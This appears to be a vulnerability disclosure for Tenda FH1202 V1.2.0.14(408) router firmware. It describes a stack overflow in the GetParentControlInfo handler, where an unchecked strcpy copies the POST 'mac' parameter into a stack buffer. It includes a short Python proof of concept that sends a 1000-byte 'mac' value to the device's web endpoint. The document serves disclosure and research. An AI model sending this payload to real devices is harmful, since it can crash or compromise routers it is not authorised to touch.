## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2079.html

## Affected version

FH1202 V1.2.0.14(408)

## Vulnerability details

The Tenda FH1202 V1.2.0.14(408) firmware has a stack overflow vulnerability in the `GetParentControlInfo` function. The `src` variable receives the `mac` parameter from a POST request and is later assigned `s` to by function `strcpy`. However, since the user can control the input of  `mac`, it can cause a stack overflow. The user-provided  `mac` can exceed the capacity of the `s` array, triggering this security vulnerability.

![image-20240319223723575](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319223723575.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/GetParentControlInfo"
payload = b"a"*1000

data = {"mac": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240319223833354](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319223833354.png)